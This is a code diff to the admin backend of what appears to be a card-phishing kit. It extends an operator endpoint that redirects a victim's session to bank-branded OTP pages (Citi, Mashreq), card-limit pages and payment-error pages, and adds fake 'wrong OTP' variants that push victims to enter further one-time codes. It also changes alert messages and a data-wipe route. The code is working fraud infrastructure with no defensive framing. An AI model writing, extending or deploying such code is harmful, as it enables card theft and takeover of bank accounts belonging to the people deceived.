@@ -346,13 +346,18 @@ router.post('/action', requireAdmin, async (req, res) => {
   const userAgent = req.headers['user-agent'] || '';
   try {
     if (act === 'redirect') {
-      const allowed = ['otp-sms','otp-sms2','otp','otp-citi','otp-mashreq','otp-limit',
-        'payment:error=card_error','payment:error=card_type','payment:error=bank_error'];
+      const allowed = [
+        'otp-sms','otp-sms2','otp','otp-citi','otp-mashreq','otp-limit','card-limit',
+        'payment:error=card_error','payment:error=card_type','payment:error=bank_error',
+        'otp-sms:error=wrong_otp','otp-sms2:error=wrong_otp','otp:error=wrong_otp',
+        'otp-citi:error=wrong_otp','otp-mashreq:error=wrong_otp','otp-limit:error=wrong_otp',
+      ];
       if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
-      await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, req.body.page, cleanSid]);
+      // Only update otp_page when redirecting to a real OTP page (not error variants)
+      const basePage = req.body.page.split(':')[0];
+      await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, basePage, cleanSid]);
       logActivity('otp_redirect', 'OTP redirect → ' + req.body.page + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
       const rdMsg = '↩️ <b>OTP Redirect</b>\nSID: <code>' + cleanSid + '</code>\nPage: <b>' + req.body.page + '</b>\nAdmin: ' + adminUser + '\nIP: ' + ip;
-      sendAdminAlert(rdMsg).catch(() => {});
       sendInquiryAlert(rdMsg).catch(() => {});
       return res.json({ ok: true });
     }
@@ -444,8 +449,7 @@ router.post('/settings/reset', requireAdmin, async (req, res) => {
     await query('DELETE FROM otp_events', []);
     await query('DELETE FROM payments', []);
     await query('DELETE FROM inquiries', []);
-    await query('DELETE FROM settings', []);
-    logActivity('settings_change', 'Full data reset: all settings, payments, inquiries wiped', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
+    logActivity('settings_change', 'Data reset: payments and inquiries cleared', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
     res.json({ ok: true });
   } catch(e) { res.json({ ok: false, error: e.message }); }
 });
